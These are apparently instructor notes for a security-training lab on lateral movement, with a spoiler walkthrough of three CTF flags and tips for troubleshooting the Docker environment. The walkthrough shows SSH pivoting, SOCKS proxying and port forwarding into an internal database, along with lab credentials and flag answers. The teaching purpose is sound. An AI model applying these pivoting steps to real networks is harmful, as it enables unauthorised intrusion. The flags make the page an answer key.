---
title: "Lab 9 Notes: Lateral Movement & Pivoting"
---

## CTF walkthrough (spoiler)

The episode's optional CTF challenge asks learners to find three flags,
reachable only by pivoting through `lab9-pivot` (10.10.9.10), with no
hints. Answers:

### Flag 1: `user.txt` on the pivot

```bash
ssh pivotuser@10.10.9.10
# password: pivot123
cat user.txt
```

Flag: `flag{lab9_pivot_host_accessed}`

### Flag 2: internal web server, via SOCKS proxy

```bash
ssh -f -N -D 1080 pivotuser@10.10.9.10
proxychains4 curl -s http://10.10.90.20
```

Flag: `flag{lab9_internal_web_via_pivot}`

### Flag 3: internal database, via direct port forward

```bash
ssh -f -N -L 3307:10.10.90.21:3306 pivotuser@10.10.9.10
mysql -h 127.0.0.1 -P 3307 -u appuser -papppass456 --skip-ssl internaldb -e "SELECT * FROM notes;"
```

Flag: `flag{lab9_port_forward_reached_internal_db}`

### Lesson

Every internal target was completely unreachable until the pivot host
provided a path — this is exactly why segmentation matters defensively,
and exactly why lateral movement is a distinct phase attackers plan for
separately from initial access.

## Common sticking points

- **`lab9-attacker` needs a few seconds after `docker compose up -d`**
  before it's usable: its entrypoint runs `apk add` at container start to
  install `openssh-client`, `proxychains-ng`, `mariadb-client`,
  `iproute2`, and `sshpass` (the base Metasploit image doesn't ship
  these). If a learner `docker exec`s in immediately and a command like
  `ssh` or `proxychains4` isn't found yet, have them wait a few seconds
  and retry.
- **`ssh -f -N -L ...` can appear to fail immediately** with something
  like `Can't connect to server on '127.0.0.1'` if the client tries the
  forwarded port before `-f` has finished backgrounding the process. The
  worksheet already tells learners to check `ss -tlnp | grep 3307` and
  just re-run the command (or drop `-f` and use `&` instead) — reinforce
  this rather than letting them assume the tunnel is broken.
- **The MySQL connection requires `--skip-ssl`**. Without it, the
  Alpine-based `mariadb-client` in the attacker container can fail the TLS
  handshake against MariaDB's default settings. This is baked into every
  worksheet command already, but if a learner types the `mysql` command
  from memory instead of copy-pasting, they may drop the flag and get a
  confusing connection error.
- **Exercise 2.3 (`nmap -sT` through proxychains) is slower** than a
  normal scan — full TCP connect scans through a SOCKS proxy take
  noticeably longer than a direct SYN scan. This is expected; it's part of
  the point (see Exercise 2.3's solution on why `-sS` isn't an option
  here), not a sign anything is stuck.
